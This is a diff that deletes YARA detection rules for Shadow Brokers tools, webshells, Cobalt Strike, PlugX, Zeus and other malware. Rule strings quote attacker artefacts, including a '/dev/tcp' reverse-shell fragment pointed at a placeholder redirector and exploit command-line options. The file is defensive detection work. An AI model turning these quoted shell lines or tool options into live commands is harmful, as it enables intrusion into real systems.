-    logic_hash  = "368c0a6a1db0003e3a2e4ec5e42a5b5563ea1c2cb89db1751226891e1f7181d8"
-    score       = 75
-    quality     = 85
-    tags        = ""
-    license     = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-    hash1       = "bcd4ee336050488f5ffeb850d8eaa11eec34d8ba099b370d94d2c83f08a4d881"
-
-  strings:
-    $s1 = "### Verify version on target:" fullword ascii
-    $s2 = "/current/bin/ExtractData ./utmp > dub.TARGETNAME" fullword ascii
-
-  condition:
-    1 of them
-}
-
-rule SIGNATURE_BASE_FVEY_Shadowbroker_Strifeworld {
-  meta:
-    description = "Auto-generated rule - file strifeworld.1"
-    author      = "Florian Roth (Nextron Systems)"
-    id          = "a15c2034-8394-5e62-a5f0-d1506c19e585"
-    date        = "2016-12-17"
-    modified    = "2023-12-05"
-    reference   = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
-    source_url  = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/yara/apt_fvey_shadowbroker_dec16.yar#L211-L225"
-    license_url = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/LICENSE"
-    logic_hash  = "2b113b042fd62109ee3ee39515fbd22f3898abf320d75f1288ea88e40b3444c0"
-    score       = 75
-    quality     = 85
-    tags        = ""
-    license     = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-    hash1       = "222b00235bf143645ad0d55b2b6839febc5b570e3def00b77699915a7c9cb670"
-
-  strings:
-    $s4 = "-p -n.\" strifeworld" fullword ascii
-    $s5 = "Running STRIFEWORLD not protected" ascii
-
-  condition:
-    1 of them
-}
-
-rule SIGNATURE_BASE_FVEY_Shadowbroker_User_Tool_Ebbisland {
-  meta:
-    description = "Auto-generated rule - file user.tool.ebbisland.COMMON"
-    author      = "Florian Roth (Nextron Systems)"
-    id          = "fd312ba2-d590-5007-875c-008553c2b1b9"
-    date        = "2016-12-17"
-    modified    = "2023-12-05"
-    reference   = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
-    source_url  = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/yara/apt_fvey_shadowbroker_dec16.yar#L244-L258"
-    license_url = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/LICENSE"
-    logic_hash  = "0a45ea3cd6aeea9299ef67ae82c9f4bf929a961695e7cce344aa1737fa4c07b0"
-    score       = 75
-    quality     = 85
-    tags        = ""
-    license     = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-    hash1       = "390e776ae15fadad2e3825a5e2e06c4f8de6d71813bef42052c7fd8494146222"
-
-  strings:
-    $x1 = "-t 127.0.0.1 -p SERVICE_TCP_PORT -r TARGET_RPC_SERVICE -X"
-    $x2 = "-N -A SPECIFIC_SHELLCODE_ADDRESS" fullword ascii
-
-  condition:
-    1 of them
-}
-
-rule SIGNATURE_BASE_FVEY_Shadowbroker_User_Tool_Elgingamble {
-  meta:
-    description = "Auto-generated rule - file user.tool.elgingamble.COMMON"
-    author      = "Florian Roth (Nextron Systems)"
-    id          = "344e5d5e-9fd6-5a32-ba98-945f5a35a116"
-    date        = "2016-12-17"
-    modified    = "2023-12-05"
-    reference   = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
-    source_url  = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/yara/apt_fvey_shadowbroker_dec16.yar#L275-L288"
-    license_url = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/LICENSE"
-    logic_hash  = "2f4dd668c59244e92ebfe0e2fc2859b2376cf1dd6fc6522e8f452787aa96365f"
-    score       = 75
-    quality     = 85
-    tags        = ""
-    license     = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-    hash1       = "4130284727ddef4610d63bfa8330cdafcb6524d3d2e7e8e0cb34fde8864c8118"
-
-  strings:
-    $x2 = "### Local exploit for" fullword ascii
-
-  condition:
-    1 of them
-}
-
-rule SIGNATURE_BASE_FVEY_Shadowbroker_README_Cup {
-  meta:
-    description = "Auto-generated rule - file README.cup.NOPEN"
-    author      = "Florian Roth (Nextron Systems)"
-    id          = "876f3d99-cc6d-568a-a202-1b4938436303"
-    date        = "2016-12-17"
-    modified    = "2023-12-05"
-    reference   = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
-    source_url  = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/yara/apt_fvey_shadowbroker_dec16.yar#L290-L304"
-    license_url = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/LICENSE"
-    logic_hash  = "bd05a23ce29be88c1a459358c984e1317cf56d21e5b378624af644fb2b41931d"
-    score       = 75
-    quality     = 85
-    tags        = ""
-    license     = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-    hash1       = "98aaad31663b89120eb781b25d6f061037aecaeb20cf5e32c36c68f34807e271"
-
-  strings:
-    $s3 = "-F file(s)   Full path to target's \"fuser\" program." fullword ascii
-    $s4 = "done after the RAT is killed." fullword ascii
-
-  condition:
-    1 of them
-}
-
-rule SIGNATURE_BASE_FVEY_Shadowbroker_User_Tool_Earlyshovel {
-  meta:
-    description = "Auto-generated rule - file user.tool.earlyshovel.COMMON"
-    author      = "Florian Roth (Nextron Systems)"
-    id          = "d2640f9f-8934-5095-9c30-f24941685c9e"
-    date        = "2016-12-17"
-    modified    = "2023-12-05"
-    reference   = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
-    source_url  = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/yara/apt_fvey_shadowbroker_dec16.yar#L321-L334"
-    license_url = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/LICENSE"
-    logic_hash  = "396810b439ac53f393ad37a8acbd7236f8325730c75c1a6339e4c6343ecade7a"
-    score       = 75
-    quality     = 85
-    tags        = ""
-    license     = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-    hash1       = "504e7a376c21ffbfb375353c5451dc69a35a10d7e2a5d0358f9ce2df34edf256"
-
-  strings:
-    $x1 = "--tip 127.0.0.1 --tport 2525 --cip REDIRECTOR_IP --cport RANDOM_PORT" ascii
-
-  condition:
-    1 of them
-}
-
-rule SIGNATURE_BASE_FVEY_Shadowbroker_User_Tool_Envisioncollision {
-  meta:
-    description = "Auto-generated rule - file user.tool.envisioncollision.COMMON"
-    author      = "Florian Roth (Nextron Systems)"
-    id          = "a738e270-a3ea-5d38-8933-797d1bd9036a"
-    date        = "2016-12-17"
-    modified    = "2023-12-05"
-    reference   = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
-    source_url  = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/yara/apt_fvey_shadowbroker_dec16.yar#L336-L352"
-    license_url = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/LICENSE"
-    logic_hash  = "36b2a20ef3a6540a686d7f52c8c885842fd84ba7c7daa74c21e241e25826030e"
-    score       = 75
-    quality     = 85
-    tags        = ""
-    license     = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-    hash1       = "2f04f078a8f0fdfc864d3d2e37d123f55ecc1d5e401a87eccd0c3846770f9e02"
-
-  strings:
-    $x1 = "-i<IP> -p<port> -U<user> -P<password> -D<directory> -c<commands>" fullword ascii
-    $x2 = "sh</dev/tcp/REDIR_IP/SHELL_PORT>&0" fullword ascii
-    $x3 = "-n ENVISIONCOLLISION" ascii
-    $x4 = "-UADMIN -PPASSWORD -i127.0.0.1 -Dipboard" fullword ascii
-
-  condition:
-    1 of them
-}
-
-rule SIGNATURE_BASE_FVEY_Shadowbroker_Gen_Readme2 {
-  meta:
-    description = "Auto-generated rule - from files user.tool.orleansstride.COMMON, user.tool.curserazor.COMMON"
-    author      = "Florian Roth (Nextron Systems)"
-    id          = "5959d881-2989-582c-abe2-48c76ce0e995"
-    date        = "2016-12-17"
-    modified    = "2023-12-05"
-    reference   = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
-    source_url  = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/yara/apt_fvey_shadowbroker_dec16.yar#L374-L389"
-    license_url = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/LICENSE"
-    logic_hash  = "eb68c415d64d1db3d4bb0f4ad994bd050cb2287e4dc7b3ac57549f818a7914d8"
-    score       = 75
-    quality     = 85
-    tags        = ""
-    license     = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-    super_rule  = 1
-    hash1       = "18dfd74c3e0bfb1c21127cf3382ba1d9812efdf3e992bd666d513aaf3519f728"
-    hash2       = "f4b728c93dba20a163b59b4790f29aed1078706d2c8b07dc7f4e07a6f3ecbe93"
-
-  strings:
-    $x1 = "#####  Upload the encrypted phone list as awk, modify each parser command to have the" fullword ascii
-
-  condition:
-    1 of them
-}
-
-rule SIGNATURE_BASE_FVEY_Shadowbroker_Gen_Readme3 {
-  meta:
-    description = "Auto-generated rule"
-    author      = "Florian Roth (Nextron Systems)"
-    id          = "41cfbf66-fb7d-5815-939f-06b23dfae746"
-    date        = "2016-12-17"
-    modified    = "2023-12-05"
-    reference   = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
-    source_url  = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/yara/apt_fvey_shadowbroker_dec16.yar#L391-L411"
-    license_url = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/LICENSE"
-    logic_hash  = "968ec80f26750ac734ad9e296b5afb35867f6c53de1e88f7c8af78daeac24b61"
-    score       = 75
-    quality     = 85
-    tags        = ""
-    license     = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-    super_rule  = 1
-    hash1       = "18dfd74c3e0bfb1c21127cf3382ba1d9812efdf3e992bd666d513aaf3519f728"
-    hash2       = "4b236b066ac7b8386a13270dcb7fdff2dda81365d03f53867eb72e29d5e496de"
-    hash3       = "3fe78949a9f3068db953b475177bcad3c76d16169469afd72791b4312f60cfb3"
-    hash4       = "64c24bbf42f15dcac04371aef756feabb7330f436c20f33cb25fbc8d0ff014c7"
-    hash5       = "a237a2bd6aec429f9941d6de632aeb9729880aa3d5f6f87cf33a76d6caa30619"
-    hash6       = "89748906d1c574a75fe030645c7572d7d4145b143025aa74c9b5e2be69df8773"
-    hash7       = "f4b728c93dba20a163b59b4790f29aed1078706d2c8b07dc7f4e07a6f3ecbe93"
-
-  strings:
-    $s3 = ":%s/CRYPTKEY/CRYPTKEY/g" fullword ascii
-
-  condition:
-    1 of them
-}
-
-rule SIGNATURE_BASE_FVEY_Shadowbroker_Gen_Readme4 {
-  meta:
-    description = "Auto-generated rule - from files violetspirit.README, violetspirit.README"
-    author      = "Florian Roth (Nextron Systems)"
-    id          = "9e84e4ab-f74a-59e5-aee2-408a68cd673f"
-    date        = "2016-12-17"
-    modified    = "2023-12-05"
-    reference   = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
-    source_url  = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/yara/apt_fvey_shadowbroker_dec16.yar#L413-L429"
-    license_url = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/LICENSE"
-    logic_hash  = "c19c77d7e7e26e01a9a50fd67cc0a7fd05069def878bf18726c3e115df307cb2"
-    score       = 75
-    quality     = 85
-    tags        = ""
-    license     = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-    super_rule  = 1
-    hash1       = "a55fec73595f885e43b27963afb17aee8f8eefe811ca027ef0d7721d073e67ea"
-    hash2       = "a55fec73595f885e43b27963afb17aee8f8eefe811ca027ef0d7721d073e67ea"
-
-  strings:
-    $s1 = "[-v rpc version] : default 4 : Solaris 8 and other patched versions use version 5" fullword ascii
-    $s5 = "[-n tcp_port]    : default use portmapper to determine" fullword ascii
-
-  condition:
-    1 of them
 }
 
 rule SIGNATURE_BASE_Crowdstrike_Shamoon_Droppedfile {
@@ -34145,32 +31036,6 @@ rule SIGNATURE_BASE_Webshell_Zehir: FILE {
     filesize < 200KB and 1 of them
 }
 
-rule SIGNATURE_BASE_Webshell_Generic_1609_A: FILE {
-  meta:
-    description = "Auto-generated rule"
-    author      = "Florian Roth (Nextron Systems)"
-    id          = "4b7db4db-8699-5b4d-ab90-ce79f1160984"
-    date        = "2016-09-10"
-    modified    = "2023-12-05"
-    reference   = "https://github.com/bartblaze/PHP-backdoors"
-    source_url  = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/yara/thor-webshells.yar#L9643-L9658"
-    license_url = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/LICENSE"
-    logic_hash  = "e5a4bba3a7b1c712203fcc8b85e4089b0ff18a26e96f5a04529616dbfb9de651"
-    score       = 75
-    quality     = 85
-    tags        = "FILE"
-    license     = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-    super_rule  = 1
-    hash1       = "c817a490cfd4d6377c15c9ac9bcfa136f4a45ff5b40c74f15216c030f657d035"
-    hash3       = "69b9d55ea2eb4a0d9cfe3b21b0c112c31ea197d1cb00493d1dddc78b90c5745e"
-
-  strings:
-    $s1 = "return $qwery45234dws($b);" fullword ascii
-
-  condition:
-    (uint16(0) == 0x3f3c and 1 of them)
-}
-
 rule SIGNATURE_BASE_Webshell_Tiny_JSP_2: FILE {
   meta:
     description = "Detects a tiny webshell - chine chopper"
@@ -34219,40 +31084,6 @@ rule SIGNATURE_BASE_Webshell_Jexboss_JSP_1: FILE {
 
   condition:
     uint16(0) == 0x253c and filesize < 1KB and 1 of ($x*) or 2 of them
-}
-
-rule SIGNATURE_BASE_Webshell_Jexboss_WAR_1: FILE {
-  meta:
-    description = "Detects JexBoss versions in WAR form"
-    author      = "Florian Roth (Nextron Systems)"
-    id          = "0973f6cf-8a5f-5449-812e-36aa6b9939df"
-    date        = "2018-11-08"
-    modified    = "2023-12-05"
-    reference   = "Internal Research"
-    source_url  = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/yara/thor-webshells.yar#L9874-L9897"
-    license_url = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/LICENSE"
-    logic_hash  = "ee9cb22496d2e36d215caa9c7e295b41cb8434322a0097bbc3d1a365dce0c156"
-    score       = 75
-    quality     = 85
-    tags        = "FILE"
-    hash1       = "6271775ab144ce9bb9138bf054b149b5813d3beb96338993c6de35330f566092"
-    hash2       = "6f14a63c3034d3762da8b3ad4592a8209a0c88beebcb9f9bd11b40e879f74eaf"
-
-  strings:
-    $ = "jbossass" fullword ascii
-    $ = "jexws.jsp" fullword ascii
-    $ = "jexws.jspPK" fullword ascii
-    $ = "jexws1.jsp" fullword ascii
-    $ = "jexws1.jspPK" fullword ascii
-    $ = "jexws2.jsp" fullword ascii
-    $ = "jexws2.jspPK" fullword ascii
-    $ = "jexws3.jsp" fullword ascii
-    $ = "jexws3.jspPK" fullword ascii
-    $ = "jexws4.jsp" fullword ascii
-    $ = "jexws4.jspPK" fullword ascii
-
-  condition:
-    uint16(0) == 0x4b50 and filesize < 4KB and 1 of them
 }
 
 rule SIGNATURE_BASE_Packager_Cve2017_11882: CVE_2017_11882 FILE {
@@ -34378,81 +31209,6 @@ rule SIGNATURE_BASE_APT_Sandworm_User_May20_1: FILE {
 
   condition:
     filesize < 4KB and all of them
-}
-
-rule SIGNATURE_BASE_HKTL_Cobaltstrike_Beacon_Strings {
-  meta:
-    description = "Identifies strings used in Cobalt Strike Beacon DLL"
-    author      = "Elastic"
-    id          = "af558aa2-a3dc-5a7a-bc74-42bb2246091c"
-    date        = "2021-03-16"
-    modified    = "2023-12-05"
-    reference   = "https://www.elastic.co/blog/detecting-cobalt-strike-with-memory-signatures"
-    source_url  = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/yara/apt_cobaltstrike.yar#L54-L67"
-    license_url = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/LICENSE"
-    logic_hash  = "4349a7ad94df2269217b55c2aef9628c4eef078566c276936accdd4f996ba2cf"
-    score       = 75
-    quality     = 85
-    tags        = ""
-
-  strings:
-    $s1 = "%02d/%02d/%02d %02d:%02d:%02d"
-    $s2 = "Started service %s on %s"
-    $s3 = "%s as %s\\%s: %d"
-
-  condition:
-    2 of them
-}
-
-rule SIGNATURE_BASE_HKTL_Cobaltstrike_Beacon_XOR_Strings {
-  meta:
-    description = "Identifies XOR'd strings used in Cobalt Strike Beacon DLL"
-    author      = "Elastic"
-    id          = "359160a8-cf1c-58a8-bf7f-c09a8d661308"
-    date        = "2021-03-16"
-    modified    = "2023-12-05"
-    reference   = "https://www.elastic.co/blog/detecting-cobalt-strike-with-memory-signatures"
-    source_url  = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/yara/apt_cobaltstrike.yar#L69-L88"
-    license_url = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/LICENSE"
-    logic_hash  = "b5009c29055784ce6371100417b862f723d7e3c1b4081c563fcd8770db48051f"
-    score       = 75
-    quality     = 85
-    tags        = ""
-    xor_s1      = "%02d/%02d/%02d %02d:%02d:%02d"
-    xor_s2      = "Started service %s on %s"
-    xor_s3      = "%s as %s\\%s: %d"
-
-  strings:
-    $s1  = "%02d/%02d/%02d %02d:%02d:%02d" xor(0x01-0xff)
-    $s2  = "Started service %s on %s" xor(0x01-0xff)
-    $s3  = "%s as %s\\%s: %d" xor(0x01-0xff)
-    $fp1 = "MalwareRemovalTool"
-
-  condition:
-    2 of ($s*) and not 1 of ($fp*)
-}
-
-rule SIGNATURE_BASE_HKTL_Cobaltstrike_Beacon_4_2_Decrypt {
-  meta:
-    description = "Identifies deobfuscation routine used in Cobalt Strike Beacon DLL version 4.2"
-    author      = "Elastic"
-    id          = "63b71eef-0af5-5765-b957-ccdc9dde053b"
-    date        = "2021-03-16"
-    modified    = "2023-12-05"
-    reference   = "https://www.elastic.co/blog/detecting-cobalt-strike-with-memory-signatures"
-    source_url  = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/yara/apt_cobaltstrike.yar#L90-L102"
-    license_url = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/LICENSE"
-    logic_hash  = "8685b1626c8d263f49ccf129dcd4fe1b42482fcdb37c2e109cedcecaed8c2407"
-    score       = 75
-    quality     = 85
-    tags        = ""
-
-  strings:
-    $a_x64 = { 4C 8B 53 08 45 8B 0A 45 8B 5A 04 4D 8D 52 08 45 85 C9 75 05 45 85 DB 74 33 45 3B CB 73 E6 49 8B F9 4C 8B 03 }
-    $a_x86 = { 8B 46 04 8B 08 8B 50 04 83 C0 08 89 55 08 89 45 0C 85 C9 75 04 85 D2 74 23 3B CA 73 E6 8B 06 8D 3C 08 33 D2 }
-
-  condition:
-    any of them
 }
 
 rule SIGNATURE_BASE_WEBSHELL_ASPX_Moveit_Jun23_1: FILE {
@@ -34950,30 +31706,6 @@ rule SIGNATURE_BASE_LOG_EXPL_Ivanti_EPMM_Mobileiron_Core_CVE_2023_35078_Jul23_1:
 
   condition:
     $xr1
-}
-
-rule SIGNATURE_BASE_MAL_WAR_Ivanti_EPMM_Mobileiron_Mi_War_Aug23: CVE_2023_35078 FILE {
-  meta:
-    description = "Detects WAR file found in the Ivanti EPMM / MobileIron Core compromises exploiting CVE-2023-35078"
-    author      = "Florian Roth"
-    id          = "cd16cf29-a90d-5c3f-b66f-e9264dbf79fb"
-    date        = "2023-08-01"
-    modified    = "2023-12-05"
-    reference   = "https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-213a"
-    source_url  = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/yara/expl_ivanti_epmm_mobileiron_cve_2023_35078.yar#L16-L32"
-    license_url = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/LICENSE"
-    logic_hash  = "0083727e34118d628c8507459bfb7f949f11af8197e201066e29e263e2c3f944"
-    score       = 85
-    quality     = 85
-    tags        = "CVE-2023-35078, FILE"
-    hash1       = "6255c75e2e52d779da39367e7a7d4b8d1b3c9c61321361952dcc05819251a127"
-
-  strings:
-    $s1 = "logsPaths.txt" ascii fullword
-    $s2 = "keywords.txtFirefox" ascii
-
-  condition:
-    uint16(0) == 0x4b50 and filesize < 20KB and all of them
 }
 
 rule SIGNATURE_BASE_Duqu1_5_Modules {
@@ -35484,51 +32216,6 @@ rule SIGNATURE_BASE_APT28_Hospitalitymalware_Document: FILE {
 
   condition:
     all of them and filesize > 75KB and filesize < 82KB
-}
-
-rule SIGNATURE_BASE_Aptgroupx_Plugxtrojanloader_Stringdecode {
-  meta:
-    description = "Rule to detect PlugX Malware"
-    author      = "Jay DiMartino"
-    id          = "c6017327-b44d-5b1d-95aa-6e1f9fbf5583"
-    date        = "2023-12-05"
-    modified    = "2023-12-05"
-    reference   = "https://t.co/4xQ8G2mNap"
-    source_url  = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/yara/apt_plugx.yar#L2-L36"
-    license_url = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/LICENSE"
-    logic_hash  = "e5ab15b035bb0169864e687e5c26732dd5b8f5f184473a33e685f53699ce4acc"
-    score       = 80
-    quality     = 85
-    tags        = ""
-    hash1       = "0535e8c300204e257f0fa57630f386e9fcc8e779"
-    hash2       = "088ebf9ccde958f32d11f4e7eb14f5332332f97d"
-    hash3       = "0c999d0bffa007e9e6b6fe593933b52f40c75b3d"
-    hash4       = "2f644e7131ec0a4f12ce04ba1e54d23856dbbfbf"
-    hash5       = "3be9148ad132ca342d5fbabea1119a175ef1df7c"
-    hash6       = "4c1ee94ec0e15491fc4f6b4095f67eee6309e62a"
-    hash7       = "587af7ce05e61d4c312d6bae12ea380116b08d7e"
-    hash8       = "5990efd83b5646a7ba419541d3a2c19260224ca3"
-    hash9       = "67970367c250c44a5feb263843cf45fd91336df5"
-    hash10      = "68f53f7188910a4cf67843aedd38c1523f1f2e7c"
-    hash11      = "962dc7e0ad37286df012f623423ac4182fe791ca"
-    hash12      = "aa0976906807af2e1b127608040aa3ef6e118a13"
-    hash13      = "b170d015e32b39fa4ac15f94d58e45e65cd16d6c"
-    hash14      = "c9b3d2cef3b34c7ee18fc2f60ff022965959613d"
-    hash15      = "cd425ce7f3e4a823d9027780e1b439759c4dc665"
-    hash16      = "d5e82513c6472d3826a22d9a15c05af8c0d33b58"
-    hash17      = "d9b32084f27ef13001060e1dcee8a1a9e95d89a6"
-    hash18      = "daa2d1cb9148b7ba5a86fa9ab593678e77c92672"
-    hash19      = "e2c098a95d1c1f0e29f207af9c5ffc5bd69a92ee"
-    hash20      = "ef8cf68dc3c80e9cb5a3fa0f92b544eab583812e"
-    hash21      = "f0fc0a4e4e0748464caa6a202d0083cd33458677"
-    hash22      = "fe1abe55529c1d6aa6b2a2f02d7e41ea58040feb"
-
-  strings:
-    $byte1 = { 8A [2-4] 8A [2-4] FF 05 00 30 00 10 [0-5] 2A [1-6] 80 [2-7] 02 [1-6] 88 0? }
-    $byte2 = { 8B [2-4] 8A [2-4] FF 05 00 30 00 10 [0-5] 2A [1-6] 80 [2-7] 02 [1-6] 88 0? }
-
-  condition:
-    any of them
 }
 
 rule SIGNATURE_BASE_Lightftp_Config: FILE {
@@ -36801,30 +33488,6 @@ rule SIGNATURE_BASE_CN_Honker_Tuoku_Script_Oracle_2: FILE {
     filesize < 3KB and all of them
 }
 
-rule SIGNATURE_BASE_Exp_EPS_CVE20152545: CVE_2015_2545 FILE {
-  meta:
-    description = "Detects EPS Word Exploit CVE-2015-2545"
-    author      = "Florian Roth (Nextron Systems)"
-    id          = "9a5f0554-b588-5b82-93df-0fdfba2af2da"
-    date        = "2017-07-19"
-    modified    = "2023-12-05"
-    reference   = "Internal Research - ME"
-    source_url  = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/yara/exploit_cve_2015_2545.yar#L2-L16"
-    license_url = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/LICENSE"
-    logic_hash  = "e1aac80a06dd71352d2776b4dfccce901d47363459853a37669af69be6e962c7"
-    score       = 70
-    quality     = 85
-    tags        = "CVE-2015-2545, FILE"
-    license     = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-
-  strings:
-    $s1 = "word/media/image1.eps" ascii
-    $s2 = "-la;7(la+" ascii
-
-  condition:
-    uint16(0) == 0x4b50 and ($s1 and #s2 > 20)
-}
-
 rule SIGNATURE_BASE_EXPL_Manageengine_CVE_2022_47966_Jan23_1 {
   meta:
     description = "Detects indicators of exploitation of ManageEngine vulnerability as described by Horizon3"
@@ -37573,28 +34236,6 @@ rule SIGNATURE_BASE_APT_MAL_Sandworm_Exaramel_Configuration_File_Ciphertext {
 
   strings:
     $ = { 6F B6 08 E9 A3 0C 8D 5E DD BE D4 }
-
-  condition:
-    all of them
-}
-
-rule SIGNATURE_BASE_APT_MAL_Sandworm_Exaramel_Socket_Path {
-  meta:
-    description = "Detects path of the unix socket created to prevent concurrent executions in Exaramel malware"
-    author      = "FR/ANSSI/SDO"
-    id          = "3aab84c9-9748-5d11-9cd7-efa9151036cf"
-    date        = "2021-02-15"
-    modified    = "2024-05-25"
-    reference   = "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf"
-    source_url  = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/yara/apt_sandworm_centreon.yar#L134-L146"
-    license_url = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/LICENSE"
-    logic_hash  = "8c049b5a7b508ca0f160d166f3c726e4a23a2c5b3105d075d7bf7a301a1c58f6"
-    score       = 80
-    quality     = 85
-    tags        = ""
-
-  strings:
-    $ = "/tmp/.applocktx"
 
   condition:
     all of them
@@ -38466,36 +35107,6 @@ rule SIGNATURE_BASE_EQGRP_RC5_RC6_Opcode {
     1 of them
 }
 
-rule SIGNATURE_BASE_KINS_DLL_Zeus {
-  meta:
-    description = "Match default bot in KINS leaked dropper, Zeus"
-    author      = "AlienVault Labs aortega@alienvault.com"
-    id          = "968ada06-c8a1-5053-95de-10aa484231cb"
-    date        = "2023-12-05"
-    modified    = "2023-12-05"
-    reference   = "http://goo.gl/arPhm3"
-    source_url  = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/yara/crime_kins_dropper.yar#L28-L48"
-    license_url = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/LICENSE"
-    logic_hash  = "bd1ebe7976d1f93856b4f8d1d62d8fff68ce6234204da9fbdc233ddbef56864d"
-    score       = 75
-    quality     = 85
-    tags        = ""
-
-  strings:
-    $n1 = "%BOTID%" fullword
-    $n2 = "%opensocks%" fullword
-    $n3 = "%openvnc%" fullword
-    $n4 = /Global\\(s|v)_ev/ fullword
-    $s1 = "\x72\x6E\x6D\x2C\x36\x7D\x76\x77"
-    $s2 = "\x18\x04\x0F\x12\x16\x0A\x1E\x08\x5B\x11\x0F\x13"
-    $s3 = "\x39\x1F\x01\x07\x15\x19\x1A\x33\x19\x0D\x1F"
-    $s4 = "\x62\x6F\x71\x78\x63\x61\x7F\x69\x2D\x67\x79\x65"
-    $s5 = "\x6F\x69\x7F\x6B\x61\x53\x6A\x7C\x73\x6F\x71"
-
-  condition:
-    all of ($n*) and 1 of ($s*)
-}
-
 rule SIGNATURE_BASE_Woolengoldfish_Generic_2 {
   meta:
     description = "Detects a operation Woolen-Goldfish sample - http://goo.gl/NpJpVZ"
@@ -38521,38 +35132,6 @@ rule SIGNATURE_BASE_Woolengoldfish_Generic_2 {
 
   condition:
     all of them
-}
-
-rule Jupyter_Dropped_File {
-  meta:
-    author      = "Lucas Acha (http://www.lukeacha.com)"
-    description = "observed wide strings with malicious DLL loaded by Jupyer malware"
-    reference   = "http://security5magics.blogspot.com/2020/12/tracking-jupyter-malware.html"
-
-  strings:
-    $a = "solarmarker.dat" nocase wide
-
-  condition:
-    all of them
-}
-
-rule Solarmarker_DLL_Jan2023 {
-  meta:
-    author      = "Lucas Acha (http://www.lukeacha.com)"
